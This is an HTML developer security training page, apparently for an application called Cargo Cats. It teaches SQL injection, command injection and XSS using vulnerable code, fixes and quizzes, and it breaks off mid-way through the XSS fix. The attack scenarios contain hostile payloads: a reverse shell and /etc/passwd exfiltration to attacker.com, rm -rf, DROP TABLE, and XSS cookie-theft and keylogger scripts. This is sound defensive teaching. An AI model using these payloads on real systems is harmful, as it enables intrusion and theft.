<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargo Cats - Developer Security Training</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
            color: #e0e0e0;
            line-height: 1.6;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
        }

        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            color: white;
        }

        header p {
            font-size: 1.2em;
            color: #f0f0f0;
        }

        .dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 25px;
            transition: all 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.2);
            border-color: rgba(102, 126, 234, 0.5);
        }

        .card h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.4em;
        }

        .stat {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 10px 0;
            padding: 10px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 8px;
        }

        .stat-label {
            color: #b0b0b0;
        }

        .stat-value {
            font-size: 1.5em;
            font-weight: bold;
        }

        .critical {
            color: #ff4757;
        }

        .high {
            color: #ffa502;
        }

        .medium {
            color: #ffd32a;
        }

        .progress-bar {
            width: 100%;
            height: 25px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            overflow: hidden;
            margin-top: 10px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            transition: width 0.5s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 0.9em;
        }

        .lesson-section {
            margin-bottom: 30px;
        }

        .lesson-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
        }

        .lesson-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
            cursor: pointer;
            padding: 20px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.2) 0%, rgba(118, 75, 162, 0.2) 100%);
            border-radius: 10px;
            transition: all 0.3s ease;
        }

        .lesson-header:hover {
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.3) 0%, rgba(118, 75, 162, 0.3) 100%);
        }

        .lesson-title {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .lesson-number {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5em;
            font-weight: bold;
            color: white;
        }

        .lesson-title h2 {
            font-size: 1.8em;
            color: white;
        }

        .severity-badge {
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.9em;
        }

        .severity-critical {
            background: #ff4757;
            color: white;
        }

        .severity-high {
            background: #ffa502;
            color: white;
        }

        .severity-medium {
            background: #ffd32a;
            color: #1a1f3a;
        }

        .lesson-content {
            display: none;
            animation: fadeIn 0.5s ease;
        }

        .lesson-content.active {
            display: block;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .subsection {
            margin: 25px 0;
        }

        .subsection h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .code-block {
            background: rgba(0, 0, 0, 0.5);
            border-left: 4px solid #667eea;
            padding: 20px;
            border-radius: 8px;
            margin: 15px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }

        .code-block.vulnerable {
            border-left-color: #ff4757;
        }

        .code-block.secure {
            border-left-color: #2ed573;
        }

        .code-label {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 5px;
            font-size: 0.85em;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .code-label.vulnerable {
            background: #ff4757;
            color: white;
        }

        .code-label.secure {
            background: #2ed573;
            color: white;
        }

        pre {
            margin: 0;
            color: #e0e0e0;
            font-size: 0.95em;
            line-height: 1.5;
        }

        .attack-scenario {
            background: rgba(255, 71, 87, 0.1);
            border: 1px solid rgba(255, 71, 87, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
        }

        .attack-scenario h4 {
            color: #ff4757;
            margin-bottom: 10px;
        }

        .info-box {
            background: rgba(102, 126, 234, 0.1);
            border: 1px solid rgba(102, 126, 234, 0.3);
            border-radius: 10px;
            padding: 20px;
            margin: 15px 0;
        }

        .info-box h4 {
            color: #667eea;
            margin-bottom: 10px;
        }

        .quiz-section {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 10px;
            padding: 25px;
            margin: 20px 0;
        }

        .quiz-question {
            margin: 20px 0;
        }

        .quiz-question h4 {
            color: white;
            margin-bottom: 15px;
            font-size: 1.1em;
        }

        .quiz-options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .quiz-option {
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .quiz-option:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #667eea;
        }

        .quiz-option.selected {
            border-color: #667eea;
            background: rgba(102, 126, 234, 0.2);
        }

        .quiz-option.correct {
            border-color: #2ed573;
            background: rgba(46, 213, 115, 0.2);
        }

        .quiz-option.incorrect {
            border-color: #ff4757;
            background: rgba(255, 71, 87, 0.2);
        }

        .quiz-feedback {
            margin-top: 15px;
            padding: 15px;
            border-radius: 8px;
            display: none;
        }

        .quiz-feedback.show {
            display: block;
        }

        .quiz-feedback.correct {
            background: rgba(46, 213, 115, 0.2);
            border: 1px solid #2ed573;
            color: #2ed573;
        }

        .quiz-feedback.incorrect {
            background: rgba(255, 71, 87, 0.2);
            border: 1px solid #ff4757;
            color: #ff4757;
        }

        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px 5px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .exercise-box {
            background: rgba(255, 255, 255, 0.03);
            border: 2px dashed rgba(102, 126, 234, 0.5);
            border-radius: 10px;
            padding: 25px;
            margin: 20px 0;
        }

        .exercise-box h4 {
            color: #667eea;
            margin-bottom: 15px;
        }

        .badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 15px;
            font-size: 0.85em;
            font-weight: bold;
            margin: 5px;
        }

        .badge-gold {
            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
            color: #1a1f3a;
        }

        .badge-silver {
            background: linear-gradient(135deg, #c0c0c0 0%, #e8e8e8 100%);
            color: #1a1f3a;
        }

        .badge-bronze {
            background: linear-gradient(135deg, #cd7f32 0%, #e6a75e 100%);
            color: white;
        }

        .resources-section {
            margin-top: 30px;
        }

        .resource-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .resource-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            transition: all 0.3s ease;
        }

        .resource-card:hover {
            transform: translateY(-5px);
            border-color: #667eea;
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.2);
        }

        .resource-card h4 {
            color: #667eea;
            margin-bottom: 10px;
        }

        .resource-card a {
            color: #b0b0b0;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .resource-card a:hover {
            color: #667eea;
        }

        .completion-indicator {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2em;
        }

        .completion-indicator.complete {
            background: #2ed573;
            color: white;
        }

        .completion-indicator.incomplete {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.3);
            color: #666;
        }

        .highlight {
            background: rgba(102, 126, 234, 0.3);
            padding: 2px 6px;
            border-radius: 3px;
            color: white;
        }

        ul, ol {
            margin-left: 25px;
            margin-top: 10px;
        }

        li {
            margin: 8px 0;
        }

        @media (max-width: 768px) {
            .dashboard {
                grid-template-columns: 1fr;
            }

            header h1 {
                font-size: 2em;
            }

            .lesson-header {
                flex-direction: column;
                text-align: center;
            }

            .lesson-title {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔐 Cargo Cats Security Training</h1>
            <p>Master Application Security - Protect Your Code, Protect Your Users</p>
        </header>

        <div class="dashboard">
            <div class="card">
                <h3>Welcome, Developer!</h3>
                <p style="margin-bottom: 15px;">This interactive training module will help you understand and fix the most critical security vulnerabilities in the Cargo Cats codebase.</p>
                <div class="stat">
                    <span class="stat-label">Your Progress</span>
                    <span class="stat-value">0/3</span>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="overallProgress" style="width: 0%">0%</div>
                </div>
            </div>

            <div class="card">
                <h3>Security Posture</h3>
                <div class="stat">
                    <span class="stat-label">Critical Issues</span>
                    <span class="stat-value critical">1</span>
                </div>
                <div class="stat">
                    <span class="stat-label">High Severity</span>
                    <span class="stat-value high">3</span>
                </div>
                <div class="stat">
                    <span class="stat-label">Medium Severity</span>
                    <span class="stat-value medium">11</span>
                </div>
            </div>

            <div class="card">
                <h3>Top 3 Vulnerabilities</h3>
                <ol style="color: #b0b0b0; font-size: 0.95em;">
                    <li><span class="critical">SQL Injection</span> - PaymentController.java</li>
                    <li><span class="high">Command Injection</span> - webhookservice app.py</li>
                    <li><span class="medium">Cross-Site Scripting</span> - frontgateservice</li>
                </ol>
            </div>

            <div class="card">
                <h3>Your Achievements</h3>
                <div style="text-align: center; padding: 10px;">
                    <span class="badge badge-silver" id="badge1" style="opacity: 0.3;">🛡️ SQL Guardian</span>
                    <span class="badge badge-silver" id="badge2" style="opacity: 0.3;">⚡ Command Master</span>
                    <span class="badge badge-silver" id="badge3" style="opacity: 0.3;">🎯 XSS Defender</span>
                </div>
            </div>
        </div>

        <!-- Lesson 1: SQL Injection -->
        <div class="lesson-section">
            <div class="lesson-card">
                <div class="lesson-header" onclick="toggleLesson('lesson1')">
                    <div class="lesson-title">
                        <div class="lesson-number">1</div>
                        <div>
                            <h2>SQL Injection</h2>
                            <p style="color: #b0b0b0; font-size: 0.9em; margin-top: 5px;">PaymentController.java:55</p>
                        </div>
                    </div>
                    <span class="severity-badge severity-critical">CRITICAL</span>
                </div>

                <div class="lesson-content" id="lesson1">
                    <div class="subsection">
                        <h3>📚 What is SQL Injection?</h3>
                        <p>SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. Attackers can insert malicious SQL statements into input fields, allowing them to:</p>
                        <ul>
                            <li>Bypass authentication and access unauthorized data</li>
                            <li>Modify or delete database records</li>
                            <li>Execute administrative operations on the database</li>
                            <li>In some cases, execute commands on the operating system</li>
                        </ul>
                    </div>

                    <div class="subsection">
                        <h3>🚨 Real Vulnerability from Cargo Cats</h3>
                        <div class="info-box">
                            <h4>Vulnerability Details</h4>
                            <p><strong>Location:</strong> com.contrast.dataservice.PaymentController.java line 55</p>
                            <p><strong>Endpoint:</strong> GET /payments?creditCard=XXX&shipmentId=1</p>
                            <p><strong>Parameters:</strong> creditCard, shipmentId</p>
                            <p><strong>Severity:</strong> <span class="critical">CRITICAL</span></p>
                        </div>

                        <div class="code-block vulnerable">
                            <span class="code-label vulnerable">❌ VULNERABLE CODE</span>
                            <pre>// PaymentController.java - Line 55
@GetMapping("/payments")
public List&lt;Payment&gt; executeRawQuery(
    @RequestParam String creditCard,
    @RequestParam String shipmentId) {

    // DANGEROUS: User input concatenated directly into SQL query
    String query = "SELECT * FROM payments WHERE " +
                   "credit_card = '" + creditCard + "' AND " +
                   "shipment_id = '" + shipmentId + "'";

    return jdbcTemplate.execute(query);
}</pre>
                        </div>
                    </div>

                    <div class="subsection">
                        <h3>💀 Why This is Dangerous</h3>
                        <div class="attack-scenario">
                            <h4>Attack Scenario 1: Data Breach</h4>
                            <p>An attacker sends this request:</p>
                            <div class="code-block">
                                <pre>GET /payments?creditCard=1234' OR '1'='1&shipmentId=1</pre>
                            </div>
                            <p>The resulting SQL query becomes:</p>
                            <div class="code-block">
                                <pre>SELECT * FROM payments WHERE credit_card = '1234' OR '1'='1' AND shipment_id = '1'</pre>
                            </div>
                            <p><strong>Result:</strong> The condition <span class="highlight">'1'='1'</span> is always true, so ALL payment records are returned, exposing sensitive credit card data!</p>
                        </div>

                        <div class="attack-scenario">
                            <h4>Attack Scenario 2: Data Destruction</h4>
                            <p>An attacker could send:</p>
                            <div class="code-block">
                                <pre>GET /payments?creditCard=1234'; DROP TABLE payments; --&shipmentId=1</pre>
                            </div>
                            <p><strong>Result:</strong> The entire payments table could be deleted!</p>
                        </div>
                    </div>

                    <div class="subsection">
                        <h3>✅ Secure Coding Pattern</h3>
                        <div class="code-block secure">
                            <span class="code-label secure">✓ SECURE CODE</span>
                            <pre>// PaymentController.java - FIXED VERSION
@GetMapping("/payments")
public List&lt;Payment&gt; executeSecureQuery(
    @RequestParam String creditCard,
    @RequestParam String shipmentId) {

    // SAFE: Using PreparedStatement with parameterized queries
    String query = "SELECT * FROM payments WHERE " +
                   "credit_card = ? AND shipment_id = ?";

    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, creditCard);  // Parameter binding
    pstmt.setString(2, shipmentId);  // Parameter binding

    return pstmt.executeQuery();
}

// Even better: Use Spring Data JPA Repository
@Repository
public interface PaymentRepository extends JpaRepository&lt;Payment, Long&gt; {
    @Query("SELECT p FROM Payment p WHERE p.creditCard = :card AND p.shipmentId = :id")
    List&lt;Payment&gt; findByCreditCardAndShipmentId(
        @Param("card") String creditCard,
        @Param("id") String shipmentId
    );
}</pre>
                        </div>

                        <div class="info-box">
                            <h4>Why This Works</h4>
                            <ul>
                                <li><strong>Parameter Binding:</strong> User input is treated as data, not executable code</li>
                                <li><strong>Type Safety:</strong> The database driver ensures data types match</li>
                                <li><strong>Automatic Escaping:</strong> Special characters are properly escaped</li>
                                <li><strong>ORM Protection:</strong> JPA/Hibernate automatically uses parameterized queries</li>
                            </ul>
                        </div>
                    </div>

                    <div class="quiz-section">
                        <h3>🎯 Test Your Knowledge</h3>

                        <div class="quiz-question">
                            <h4>Question 1: Which of the following is the BEST defense against SQL Injection?</h4>
                            <div class="quiz-options">
                                <div class="quiz-option" onclick="checkAnswer(1, 1, 2)">
                                    A) Input validation using regular expressions
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(1, 2, 2)">
                                    B) Using PreparedStatement with parameterized queries
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(1, 3, 2)">
                                    C) Encrypting user input before using it in queries
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(1, 4, 2)">
                                    D) Using stored procedures exclusively
                                </div>
                            </div>
                            <div class="quiz-feedback" id="feedback-1-1">
                                <strong>Correct!</strong> PreparedStatement with parameterized queries is the gold standard for preventing SQL Injection because it separates SQL code from data.
                            </div>
                            <div class="quiz-feedback" id="feedback-1-2">
                                <strong>Incorrect.</strong> While helpful, this is not sufficient. PreparedStatement with parameterized queries is the most effective defense.
                            </div>
                        </div>

                        <div class="quiz-question">
                            <h4>Question 2: What makes the following code vulnerable?<br><code style="color: #ff4757;">query = "SELECT * FROM users WHERE id = " + userId;</code></h4>
                            <div class="quiz-options">
                                <div class="quiz-option" onclick="checkAnswer(2, 1, 1)">
                                    A) User input is concatenated directly into the SQL query
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(2, 2, 1)">
                                    B) The query doesn't use the WHERE clause
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(2, 3, 1)">
                                    C) The userId parameter should be encrypted
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(2, 4, 1)">
                                    D) The SELECT * statement is too broad
                                </div>
                            </div>
                            <div class="quiz-feedback" id="feedback-2-1">
                                <strong>Perfect!</strong> String concatenation allows attackers to inject malicious SQL code. Always use parameterized queries!
                            </div>
                            <div class="quiz-feedback" id="feedback-2-2">
                                <strong>Not quite.</strong> The main issue is string concatenation. User input should never be directly concatenated into SQL queries.
                            </div>
                        </div>

                        <button class="btn btn-primary" onclick="completeLesson(1)">Mark Lesson as Complete</button>
                    </div>

                    <div class="exercise-box">
                        <h4>💪 Hands-On Exercise</h4>
                        <p><strong>Task:</strong> Review your codebase and identify all locations where SQL queries are built using string concatenation. Convert them to use PreparedStatement or JPA repositories.</p>
                        <ol>
                            <li>Search for patterns like: <code>+ variable +</code> inside SQL strings</li>
                            <li>Replace with PreparedStatement using <code>?</code> placeholders</li>
                            <li>Use <code>setString()</code>, <code>setInt()</code>, etc. to bind parameters</li>
                            <li>Test thoroughly to ensure functionality is preserved</li>
                            <li>Run Contrast Assess to verify the vulnerability is resolved</li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>

        <!-- Lesson 2: Command Injection -->
        <div class="lesson-section">
            <div class="lesson-card">
                <div class="lesson-header" onclick="toggleLesson('lesson2')">
                    <div class="lesson-title">
                        <div class="lesson-number">2</div>
                        <div>
                            <h2>Command Injection</h2>
                            <p style="color: #b0b0b0; font-size: 0.9em; margin-top: 5px;">webhookservice app.py:284</p>
                        </div>
                    </div>
                    <span class="severity-badge severity-high">HIGH</span>
                </div>

                <div class="lesson-content" id="lesson2">
                    <div class="subsection">
                        <h3>📚 What is Command Injection?</h3>
                        <p>Command Injection (also called OS Command Injection) is a vulnerability that allows attackers to execute arbitrary operating system commands on the server hosting the application. This happens when:</p>
                        <ul>
                            <li>Application passes unsafe user input to system shell commands</li>
                            <li>Special shell characters are not properly sanitized</li>
                            <li>Input is used with functions like <code>os.system()</code>, <code>subprocess.call()</code> with <code>shell=True</code></li>
                        </ul>
                    </div>

                    <div class="subsection">
                        <h3>🚨 Real Vulnerability from Cargo Cats</h3>
                        <div class="info-box">
                            <h4>Vulnerability Details</h4>
                            <p><strong>Location:</strong> webhookservice app.py line 284</p>
                            <p><strong>Endpoint:</strong> POST /testConnection</p>
                            <p><strong>Language:</strong> Python (Flask)</p>
                            <p><strong>Severity:</strong> <span class="high">HIGH</span></p>
                        </div>

                        <div class="code-block vulnerable">
                            <span class="code-label vulnerable">❌ VULNERABLE CODE</span>
                            <pre># app.py - Line 284
@app.route('/testConnection', methods=['POST'])
def test_connection():
    data = request.get_json()
    host = data.get('host', 'localhost')

    # DANGEROUS: User input passed directly to shell command
    command = f"ping -c 4 {host}"
    result = subprocess.run(command, shell=True,
                          capture_output=True, text=True)

    return jsonify({
        'success': True,
        'output': result.stdout
    })</pre>
                        </div>
                    </div>

                    <div class="subsection">
                        <h3>💀 Why This is Dangerous</h3>
                        <div class="attack-scenario">
                            <h4>Attack Scenario 1: Reverse Shell</h4>
                            <p>An attacker sends this payload:</p>
                            <div class="code-block">
                                <pre>POST /testConnection
Content-Type: application/json

{
    "host": "127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
}</pre>
                            </div>
                            <p>The command executed on the server becomes:</p>
                            <div class="code-block">
                                <pre>ping -c 4 127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1</pre>
                            </div>
                            <p><strong>Result:</strong> The attacker gets a reverse shell with full access to the server!</p>
                        </div>

                        <div class="attack-scenario">
                            <h4>Attack Scenario 2: Data Exfiltration</h4>
                            <p>An attacker could send:</p>
                            <div class="code-block">
                                <pre>{
    "host": "127.0.0.1 && cat /etc/passwd | curl -X POST -d @- https://attacker.com/steal"
}</pre>
                            </div>
                            <p><strong>Result:</strong> Sensitive system files are exfiltrated to the attacker's server!</p>
                        </div>

                        <div class="attack-scenario">
                            <h4>Attack Scenario 3: System Destruction</h4>
                            <p>An attacker could send:</p>
                            <div class="code-block">
                                <pre>{
    "host": "127.0.0.1; rm -rf /app/*"
}</pre>
                            </div>
                            <p><strong>Result:</strong> Application files could be deleted, causing complete service disruption!</p>
                        </div>
                    </div>

                    <div class="subsection">
                        <h3>✅ Secure Coding Pattern</h3>
                        <div class="code-block secure">
                            <span class="code-label secure">✓ SECURE CODE - Option 1: Whitelist Validation</span>
                            <pre># app.py - FIXED VERSION (Whitelist)
import re

@app.route('/testConnection', methods=['POST'])
def test_connection():
    data = request.get_json()
    host = data.get('host', 'localhost')

    # SAFE: Strict validation - only allow valid hostnames/IPs
    if not re.match(r'^[a-zA-Z0-9\.\-]+$', host):
        return jsonify({
            'success': False,
            'error': 'Invalid host format'
        }), 400

    # SAFE: Use list format WITHOUT shell=True
    result = subprocess.run(
        ['ping', '-c', '4', host],  # List format
        shell=False,                 # Never use shell=True!
        capture_output=True,
        text=True,
        timeout=5
    )

    return jsonify({
        'success': True,
        'output': result.stdout
    })</pre>
                        </div>

                        <div class="code-block secure">
                            <span class="code-label secure">✓ SECURE CODE - Option 2: Avoid Shell Commands</span>
                            <pre># app.py - EVEN BETTER: Use Python libraries instead
import socket

@app.route('/testConnection', methods=['POST'])
def test_connection():
    data = request.get_json()
    host = data.get('host', 'localhost')
    port = data.get('port', 80)

    # BEST: No shell commands at all - use native Python
    try:
        socket.setdefaulttimeout(3)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return jsonify({
            'success': True,
            'message': f'Successfully connected to {host}:{port}'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 400</pre>
                        </div>

                        <div class="info-box">
                            <h4>Defense Strategies</h4>
                            <ol>
                                <li><strong>Avoid Shell Commands:</strong> Use native libraries instead of shelling out</li>
                                <li><strong>Never Use shell=True:</strong> Always use list format with subprocess</li>
                                <li><strong>Whitelist Validation:</strong> Only allow known-safe characters</li>
                                <li><strong>Input Sanitization:</strong> Remove/escape special characters: <code>; & | $ ` \ " '</code></li>
                                <li><strong>Principle of Least Privilege:</strong> Run processes with minimal permissions</li>
                            </ol>
                        </div>
                    </div>

                    <div class="quiz-section">
                        <h3>🎯 Test Your Knowledge</h3>

                        <div class="quiz-question">
                            <h4>Question 1: Which subprocess usage is MOST secure?</h4>
                            <div class="quiz-options">
                                <div class="quiz-option" onclick="checkAnswer(3, 1, 3)">
                                    A) subprocess.run(f"ls {user_input}", shell=True)
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(3, 2, 3)">
                                    B) subprocess.run("ls " + user_input, shell=False)
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(3, 3, 3)">
                                    C) subprocess.run(['ls', user_input], shell=False)
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(3, 4, 3)">
                                    D) os.system(f"ls {user_input}")
                                </div>
                            </div>
                            <div class="quiz-feedback" id="feedback-3-1">
                                <strong>Excellent!</strong> Using a list with shell=False is the safest approach. Each argument is passed separately, preventing command injection.
                            </div>
                            <div class="quiz-feedback" id="feedback-3-2">
                                <strong>Not quite.</strong> Option C (list format with shell=False) is the most secure approach.
                            </div>
                        </div>

                        <div class="quiz-question">
                            <h4>Question 2: Which characters are commonly used in command injection attacks?</h4>
                            <div class="quiz-options">
                                <div class="quiz-option" onclick="checkAnswer(4, 1, 1)">
                                    A) ; & | $ `
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(4, 2, 1)">
                                    B) @ # % ^
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(4, 3, 1)">
                                    C) [ ] { }
                                </div>
                                <div class="quiz-option" onclick="checkAnswer(4, 4, 1)">
                                    D) + - * /
                                </div>
                            </div>
                            <div class="quiz-feedback" id="feedback-4-1">
                                <strong>Correct!</strong> Characters like semicolon, ampersand, pipe, dollar sign, and backticks are shell metacharacters used to chain commands.
                            </div>
                            <div class="quiz-feedback" id="feedback-4-2">
                                <strong>Incorrect.</strong> Shell metacharacters include: ; & | $ ` which allow command chaining and injection.
                            </div>
                        </div>

                        <button class="btn btn-primary" onclick="completeLesson(2)">Mark Lesson as Complete</button>
                    </div>

                    <div class="exercise-box">
                        <h4>💪 Hands-On Exercise</h4>
                        <p><strong>Task:</strong> Audit your Python codebase for command injection vulnerabilities.</p>
                        <ol>
                            <li>Search for: <code>subprocess.run(</code>, <code>subprocess.Popen(</code>, <code>os.system(</code>, <code>os.popen(</code></li>
                            <li>Check if <code>shell=True</code> is used - this is a red flag!</li>
                            <li>Verify that user input is never concatenated into commands</li>
                            <li>Replace with list format: <code>['command', 'arg1', 'arg2']</code></li>
                            <li>Consider using native Python libraries instead of shell commands</li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>

        <!-- Lesson 3: Cross-Site Scripting (XSS) -->
        <div class="lesson-section">
            <div class="lesson-card">
                <div class="lesson-header" onclick="toggleLesson('lesson3')">
                    <div class="lesson-title">
                        <div class="lesson-number">3</div>
                        <div>
                            <h2>Cross-Site Scripting (XSS)</h2>
                            <p style="color: #b0b0b0; font-size: 0.9em; margin-top: 5px;">frontgateservice - /api/shipments/track</p>
                        </div>
                    </div>
                    <span class="severity-badge severity-medium">MEDIUM</span>
                </div>

                <div class="lesson-content" id="lesson3">
                    <div class="subsection">
                        <h3>📚 What is Cross-Site Scripting (XSS)?</h3>
                        <p>Cross-Site Scripting (XSS) is a client-side code injection attack where attackers inject malicious scripts into web pages viewed by other users. There are three main types:</p>
                        <ul>
                            <li><strong>Reflected XSS:</strong> Malicious script comes from the current HTTP request (like our case)</li>
                            <li><strong>Stored XSS:</strong> Malicious script is stored in the database and displayed to users</li>
                            <li><strong>DOM-based XSS:</strong> Vulnerability exists in client-side code rather than server-side</li>
                        </ul>
                    </div>

                    <div class="subsection">
                        <h3>🚨 Real Vulnerability from Cargo Cats</h3>
                        <div class="info-box">
                            <h4>Vulnerability Details</h4>
                            <p><strong>Location:</strong> frontgateservice - ShipmentController.java</p>
                            <p><strong>Endpoint:</strong> GET /api/shipments/track?trackingId=XXX</p>
                            <p><strong>Type:</strong> Reflected XSS</p>
                            <p><strong>Severity:</strong> <span class="medium">MEDIUM</span></p>
                        </div>

                        <div class="code-block vulnerable">
                            <span class="code-label vulnerable">❌ VULNERABLE CODE</span>
                            <pre>// ShipmentController.java
@GetMapping("/api/shipments/track")
public ResponseEntity&lt;String&gt; trackShipment(
    @RequestParam String trackingId) {

    // DANGEROUS: User input reflected directly in response without encoding
    String response = "Tracking information for: " + trackingId;

    return ResponseEntity.ok()
        .contentType(MediaType.TEXT_HTML)
        .body("&lt;html&gt;&lt;body&gt;" + response + "&lt;/body&gt;&lt;/html&gt;");
}</pre>
                        </div>
                    </div>

                    <div class="subsection">
                        <h3>💀 Why This is Dangerous</h3>
                        <div class="attack-scenario">
                            <h4>Attack Scenario 1: Session Hijacking</h4>
                            <p>An attacker crafts a malicious URL:</p>
                            <div class="code-block">
                                <pre>GET /api/shipments/track?trackingId=&lt;script&gt;
    fetch('https://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;</pre>
                            </div>
                            <p>When a victim clicks this link, the script executes in their browser:</p>
                            <div class="code-block">
                                <pre>&lt;html&gt;&lt;body&gt;
Tracking information for: &lt;script&gt;
    fetch('https://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;
&lt;/body&gt;&lt;/html&gt;</pre>
                            </div>
                            <p><strong>Result:</strong> The victim's session cookie is stolen, allowing the attacker to impersonate them!</p>
                        </div>

                        <div class="attack-scenario">
                            <h4>Attack Scenario 2: Phishing</h4>
                            <p>An attacker injects a fake login form:</p>
                            <div class="code-block">
                                <pre>trackingId=&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;
background:white;z-index:9999"&gt;
&lt;h1&gt;Session Expired - Please Login&lt;/h1&gt;
&lt;form action="https://attacker.com/phish"&gt;
    Username: &lt;input name="user"&gt;&lt;br&gt;
    Password: &lt;input type="password" name="pass"&gt;&lt;br&gt;
    &lt;button&gt;Login&lt;/button&gt;
&lt;/form&gt;
&lt;/div&gt;</pre>
                            </div>
                            <p><strong>Result:</strong> Users unknowingly submit their credentials to the attacker's server!</p>
                        </div>

                        <div class="attack-scenario">
                            <h4>Attack Scenario 3: Keylogging</h4>
                            <p>An attacker injects a keylogger:</p>
                            <div class="code-block">
                                <pre>trackingId=&lt;script&gt;
    document.addEventListener('keypress', function(e) {
        fetch('https://attacker.com/log?key=' + e.key);
    });
&lt;/script&gt;</pre>
                            </div>
                            <p><strong>Result:</strong> Every keystroke is sent to the attacker, capturing passwords and sensitive data!</p>
                        </div>
                    </div>

                    <div class="subsection">
                        <h3>✅ Secure Coding Pattern</h3>
                        <div class="code-block secure">
                            <span class="code-label secure">✓ SECURE CODE - Option 1: Output Encoding</span>
                            <pre>// ShipmentController.java - FIXED VERSION
import org.springframework.web.util.HtmlUtils;

@GetMapping("/api/shipments/track")
